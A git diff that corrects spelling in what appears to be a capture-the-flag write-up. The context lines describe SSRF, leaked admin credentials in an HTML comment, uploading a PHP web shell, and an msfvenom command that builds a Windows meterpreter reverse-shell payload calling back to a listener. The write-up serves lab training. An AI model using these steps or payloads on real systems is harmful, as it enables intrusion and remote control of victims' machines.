@@ -84,7 +84,7 @@ but there is a `/beta.php` which allows to fetch urls, and also allows SSRF.
 
 with that we can access to port `5000` and `443` which gives "403 Forbidden", because both are on save host.
 
-port `443` https don't response anything but port `5000` repsonse with admin creds.
+port `443` https don't response anything but port `5000` response with admin creds.
 
 ![](screenshots/vote-admin-creds.png)
 <!--admin:@LoveIsInTheAir!!!!-->
@@ -104,7 +104,7 @@ Try to upload php shell from `/voters.php`
 
 ![](screenshots/file-uploading.png)
 
-and file uploaded successfully without any restrication and upload file found in the `/images` directory
+and file uploaded successfully without any restriction and upload file found in the `/images` directory
 
 ![](screenshots/file-uploaded.png)
 
@@ -121,7 +121,7 @@ upload `shell.php`, start http server and get reverse shell.
 
 ![](screenshots/web-shell.gif)
 
-Get msf shell with msfvenom paylaod
+Get msf shell with msfvenom payload
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.71 LPORT=4141 -f psh -o msf_shell.ps1
 ```
